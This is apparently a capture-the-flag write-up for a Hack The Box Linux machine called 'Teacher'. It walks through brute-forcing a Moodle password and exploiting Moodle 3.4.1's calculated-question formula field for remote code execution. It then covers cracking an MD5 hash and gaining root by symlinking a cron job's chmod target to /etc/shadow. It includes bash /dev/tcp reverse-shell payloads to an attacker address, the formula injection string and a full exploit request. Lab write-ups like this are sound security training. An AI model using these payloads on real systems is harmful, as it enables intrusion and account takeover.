# Teacher
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `giovanni` | Hidden Information Disclosure, Password Brute-Force | An Nmap scan revealed only port 80 (HTTP) was open, serving an Apache web server. Directory enumeration with `gobuster` found a `/moodle` directory. Manual enumeration of the main website revealed an interesting file, `images/5.png`. Upon inspecting the file with `xxd`, it was found to be an ASCII text file containing a partial password for a user named `Giovanni`: `Th4C00lTheacha`. A character brute-force with `wfuzz` against the Moodle login page successfully identified the missing character, revealing the full password: `Th4C00lTheacha#`. |
| 2 | `www-data` | Moodle RCE, Reverse Shell | The Moodle version was identified as 3.4.1 by examining the Moodle documentation link at the bottom of a course page. This version is vulnerable to a known Remote Code Execution (RCE) exploit. An RCE payload was manually injected by creating a new quiz question and using the vulnerable formula field to execute a reverse shell. This granted a shell as the `www-data` user. An alternative, automated method using a public exploit script (`php/webapps/46551.php`) was also successful after modifying the payload to use a more reliable `bash` reverse shell. |
| 3 | `giovanni` | Credential Reuse, MD5 Hash Crack | After gaining a shell as `www-data`, the Moodle configuration file `/var/www/html/moodle/config.php` was accessed. It contained database credentials: `root:Welkom1!`. These credentials were used to access the Moodle database and dump user information, including a username `Giovannibak` with an MD5 hash: `7a860966115182402ed06375cf0a22af`. The MD5 hash was easily cracked online to the password `expelled`. This password was then used to gain access to the `giovanni` user via `su`. |
| 4 | `root` | `PATH` Hijacking, Cron Job Misconfiguration | As user `giovanni`, a directory `/home/giovanni/work` was found. A `pspy` scan revealed a cron job running as `root` that executed a script at `/usr/bin/backup.sh`. This script changed the directory to `/home/giovanni/work` and performed various operations, including a `chmod 777` on files within a subdirectory named `tmp`. This was a privilege escalation vulnerability. By replacing the `tmp` subdirectory with a symbolic link to `/etc/shadow`, the cron job was tricked into recursively changing the permissions of `/etc/shadow` to be world-writable. This allowed the attacker to modify the `root` user's password hash in `/etc/shadow` with a known password and then `su` to root. |
| 5 | `root` | Final Flag | With a root shell obtained through the password change, the final flag was retrieved. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Nmap scan report for 10.10.10.153
Host is up (0.037s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Blackhat highschool
|_http-server-header: Apache/2.4.25 (Debian)
```
Since port 80 is the only one opened, let's dig into it.
We can start gobuster in background while manually enumerating the site.  
When gobuster is done, it shows the following:
```
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.153/css/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.10.153/manual/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.153/js/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.10.153/javascript/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.153/images/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.153/fonts/]
/phpmyadmin           (Status: 403) [Size: 297]
/moodle               (Status: 301) [Size: 313] [--> http://10.10.10.153/moodle/]
/server-status        (Status: 403) [Size: 300]
```
Before jumping into moodle, poking around on the site, we can see that in /gallery.html, one image is missing.  
If we inspect the source code, we can see the following:
```
<li><a href="#"><img src="images/5.png" onerror="console.log('That\'s an F');" alt=""></a></li>
```
Since this is quite strange, let's open th /images/ dir.  
As we can notice, image 5.png has a strange size:
```
4_6.png	2018-06-27 03:25 	4.7K	 
5.png	2018-06-27 03:43 	200 	 
5_2.png	2018-06-27 03:25 	6.5K
```
Now, let's try to download this file and check what we have:
```
[root@kali Teacher ]$ xxd 5.png   
00000000: 4869 2053 6572 7669 6365 6465 736b 2c0a  Hi Servicedesk,.
00000010: 0a49 2066 6f72 676f 7420 7468 6520 6c61  .I forgot the la
00000020: 7374 2063 6861 7261 6368 7465 7220 6f66  st charachter of
00000030: 206d 7920 7061 7373 776f 7264 2e20 5468   my password. Th
00000040: 6520 6f6e 6c79 2070 6172 7420 4920 7265  e only part I re
00000050: 6d65 6d62 6572 6564 2069 7320 5468 3443  membered is Th4C
00000060: 3030 6c54 6865 6163 6861 2e0a 0a43 6f75  00lTheacha...Cou
00000070: 6c64 2079 6f75 2067 7579 7320 6669 6775  ld you guys figu
00000080: 7265 206f 7574 2077 6861 7420 7468 6520  re out what the
00000090: 6c61 7374 2063 6861 7261 6368 7465 7220  last charachter
000000a0: 6973 2c20 6f72 206a 7573 7420 7265 7365  is, or just rese
000000b0: 7420 6974 3f0a 0a54 6861 6e6b 732c 0a47  t it?..Thanks,.G
000000c0: 696f 7661 6e6e 690a                      iovanni.
[root@kali Teacher ]$ file 5.png    
5.png: ASCII text
```
as we can see we have a text file, let's open it:
```
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
```
This is basically giving us a password, and since the only login prompt we've seen so far is for /moodle/, let's try to exploit this.  
We can use wfuzz to enumerate all the possible characters, and since password usully contains special chars, let's use the special chars dictionary.  
```
[root@kali Teacher ]$ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -d 'anchor=&username=Giovanni&password=Th4C00lTheachaFUZZ' http://10.10.10.153/moodle/login/index.php
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.153/moodle/login/index.php
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

[... SNIP ....]

000000022:   303        6 L      34 W       440 Ch      "`"                                                                                                                                                                         
000000029:   303        6 L      34 W       440 Ch      "'"                                                                                                                                                                         
000000028:   303        6 L      34 W       440 Ch      ":"                                                                                                                                                                         
000000004:   303        6 L      34 W       454 Ch      "#"                                                                                                                                                                         
000000026:   303        6 L      34 W       440 Ch      "?"                                                                                                                                                                         
000000025:   303        6 L      34 W       440 Ch      "/"                                                                                                                                                                         
000000031:   303        6 L      34 W       440 Ch      "<"                                                                                                                                                                         
000000032:   303        6 L      34 W       440 Ch      ">"                                                                                                                                                                         
000000030:   303        6 L      34 W       440 Ch      """                                                                                                                                                                         
000000027:   303        6 L      34 W       440 Ch      ";"                                                                                                                                                                         
000000024:   303        6 L      34 W       440 Ch      "."                                                                                                                                                                         
000000021:   303        6 L      34 W       440 Ch      "\"                                                                                                                                                                         
000000023:   303        6 L      34 W       440 Ch      ","  
```
As we can see, the charactes count of one of the responses is giving 454, while all the others are giving 440.  
Now we can suppose that the request with the final '#' correspond to the actual password.  
```
Giovanni:Th4C00lTheacha#
```

## Foothols
Once we login into moodle, the first thing we need to do is try to enumerate the software version.  
Just googling for 'moodle enumerate version' we can came across [this official document](https://docs.moodle.org/311/en/Moodle_version) that shows how to enumerate version if you are not an admin.  
So, now, let's follow the indication of this document and let's open a course, scroll to the bottom of the page and click on 'moodle docs for this page', as we can see, when we open the url, in the address bar we can se '34', this means that the webserver is running version 3.4.  
Now that we have the version let's searchsploit for moodle:
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
[... SNIP ...]
Moodle 3.10.3 - 'url' Persistent Cross Site Scripting                                                                                                                                                      | php/webapps/49797.txt
Moodle 3.4.1 - Remote Code Execution                                                                                                                                                                       | php/webapps/46551.php
Moodle 3.6.1 - Persistent Cross-Site Scripting (XSS)                                                                                                                                                       | php/webapps/49814.txt
Moodle 3.6.3 - 'Install Plugin' Remote Command Execution (Metasploit)                                                                                                                                      | php/remote/46775.rb
Moodle 3.8 - Unrestricted File Upload                                                                                                                                                                      | php/webapps/49114.txt
[... SNIP ...]
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
As we can see there is php/webapps/46551.php that is pretty close to our running version, so let's try to use it.

### Method 1 - php/webapps/46551.php Automatic Exploitation
Since if we first run the exploit with the default parameters is not giving a shell, we can try to change the payload and use something more reliable than python, so, we change...  
This:
```
// Inject a reverse shell                                                                                 
// You could modify this payload to inject whatever you like
$this->payload = "(python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"".$this->ip."\",".$this->port."))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b')";
```
tho this:  
```
// Inject a reverse shell                                                                                 
// You could modify this payload to inject whatever you like                                              
$this->payload = "(bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.22/4444+0>%261')";
```
Now we can see that when we run the exploit again, we get a shell:
```
root@kali:~/Documents/HTB/Boxes/Teacher# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.153] 34212
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
www-data@teacher:/var/www/html/moodle/question$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@teacher:/var/www/html/moodle/question$
```

### Method 2 - php/webapps/46551.php Manual Exploitation
Since we are curious and we don't like easy things, let's try to exploit this manually.
Let's help ourselves by reading the code of the actual exploit and using [This Advisory](https://blog.sonarsource.com/moodle-remote-code-execution).  
So now, let's open the Algebra course administration page, and open:  
Settings -> Turn Editing On -> Add Activity or Resource.  
Then: Edit Quiz -> Add New Question -> Calculated.  
Now in the Formula section we can add our payload (according to the security advisory source):  
```
/*{a*/`$_REQUEST[cmd]`;//{x}}
```
Now, we can click next couple of times and send the following request using burp:
```
GET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=9&wizardnow=datasetitems&cmid=7&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.22/4444+0>%261' HTTP/1.1
Host: 10.10.10.153
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: MoodleSession=bqljifn8h4dlhqg0045bi47qn1
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
And we can get a shell as www-data.

## User
Once we are inside the system, the first thing that we want to (always) look at, is the credentials for the database inside the code.  
```
www-data@teacher:/var/www/html/moodle$ ls | grep config
config-dist.php.bak
config.php
config.php.save
```
if we open the file:
```
$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);
```
Now we can log in into database moodle and extract users hashes:
```
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
```
As we can see password fow 'Giovannibak' is slightly different from the others:
```
[root@kali exploits ]$ echo "7a860966115182402ed06375cf0a22af" | wc -c                                      
33
```
Since this string is 32 characters we can suppose this is a MD5 digest.  
MD5 hashes are easy to crack, since most of the cracked hashes are available online.  
So, now, let's just google for the hash, and as we can see, as first result, we do get a page that displays the [cracked hash](https://md5.gromweb.com/?md5=7a860966115182402ed06375cf0a22af):
```
The MD5 hash:
7a860966115182402ed06375cf0a22af
was succesfully reversed into the string:
expelled
```
so now, we can su to giovanni using password 'expelled'

## Root
now that we are logged in as giovanni, we can notice a 'work/' directory inside the home folder.  
if we inspect files/subfolders, we can see that one file 'backup_courses.tar.gz' has been created one minute ago.
```
giovanni@teacher:~/work$ ls -ltra
total 16
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp
drwxr-xr-x 4 giovanni giovanni 4096 Jun 27  2018 .
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses
drwxr-x--- 4 giovanni giovanni 4096 Nov  4  2018 ..
giovanni@teacher:~/work$ ls -ltra *
tmp:
total 16
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 .
drwxr-xr-x 4 giovanni giovanni 4096 Jun 27  2018 ..
drwxrwxrwx 3 root     root     4096 Jun 27  2018 courses
-rwxrwxrwx 1 root     root      256 Dec 23 17:38 backup_courses.tar.gz

courses:
total 12
drwxr-xr-x 2 root     root     4096 Jun 27  2018 algebra
drwxr-xr-x 4 giovanni giovanni 4096 Jun 27  2018 ..
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 .
giovanni@teacher:~/work$ date
Thu Dec 23 17:39:16 CET 2021
```
as we can see 'backup_courses.tar.gz' is owned by root, so we can suppose that there is a cronjob that is running as root and is compressing some diretory into this tar archive.  
now, to discover what this cronjob is about, we can use pspy and see what it takes out:
```
2021/12/23 17:50:01 CMD: UID=0    PID=4678   | /bin/bash /usr/bin/backup.sh
2021/12/23 17:50:01 CMD: UID=0    PID=4679   | tar -czvf tmp/backup_courses.tar.gz courses/algebra
2021/12/23 17:50:01 CMD: UID=0    PID=4680   | gzip
2021/12/23 17:50:01 CMD: UID=0    PID=4681   | /bin/bash /usr/bin/backup.sh
2021/12/23 17:50:01 CMD: UID=0    PID=4682   | tar -xf backup_courses.tar.gz
2021/12/23 17:50:01 CMD: UID=0    PID=4683   | /bin/bash /usr/bin/backup.sh
```
as we can see, there is a cron running as UID=0 (root) and is executing ```/bin/bash /usr/bin/backup.sh```.  
Now, let's open this file and see what this is about:  
```
giovanni@teacher:/dev/shm$ ls -l /usr/bin/backup.sh
-rwxr-xr-x 1 root root 138 Jun 27  2018 /usr/bin/backup.sh
giovanni@teacher:/dev/shm$ cat /usr/bin/backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```
As we can see it is granting 777 permissions to everything under /home/giovanni/work/tmp.  
Now we can trigger this program to error by removing tmp/ folder and replacing it with a symlink to /etc/shadow.  
```
giovanni@teacher:~/work$ ln -s /etc/shadow tmp
giovanni@teacher:~/work$ ls -l
total 4
drwxrwxrwx 3 giovanni giovanni 4096 Jun 27  2018 courses
lrwxrwxrwx 1 giovanni giovanni   11 Dec 23 17:54 tmp -> /etc/shadow
```
Now, we can wait for a minute and get /etc/shadow world writable:
```
giovanni@teacher:~/work$ ls -l /etc/shadow
-rwxrwxrwx 1 root shadow 961 Jun 27  2018 /etc/shadow
```
Now we can reuse giovanni /etc/shadow password or create a new password using openssl:
```
[root@kali Teacher ]$ openssl passwd -6 -salt xyz password
$6$xyz$ShNnbwk5fmsyVIlzOf8zEg4YdEH2aWRSuY4rJHbzLZRlWcoXbxxoI0hfn0mdXiJCdBJ/lTpKjk.vu5NZOv0UM0
```
now we can su to root providinf the password 'password'
```
giovanni@teacher:~/work$ su -
Password:
root@teacher:~# id
uid=0(root) gid=0(root) groups=0(root)
```
and we owned root.
For the sake of knowledge, now that we are root, let's examine again the backup script:
```
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```
If we try to run this manually, with the tmp folder replaced with the symlink to /etc/shadow we can see in the stderr the following output:  
```
courses/algebra/
courses/algebra/answersAlgebra
tar (child): tmp/backup_courses.tar.gz: Cannot open: Not a directory
tar (child): Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error is not recoverable: exiting now
/usr/bin/backup.sh: line 4: cd: tmp: Not a directory
tar: backup_courses.tar.gz: Cannot open: No such file or directory
tar: Error is not recoverable: exiting now
```
So, the script:
* changes directory to /home/giovanni/work
* tar a file without success (because tmp is 'Not a directory')
* cd to tmp that fails (because tmp is 'Not a directory')
* the tar extraction fails again because the previous archive has not been created, so it gives 'No such file or directory'
* and then recursively chmod with 777 the current directory which is /home/giovanni/work (containing the symlink to /etc/shadow as well)

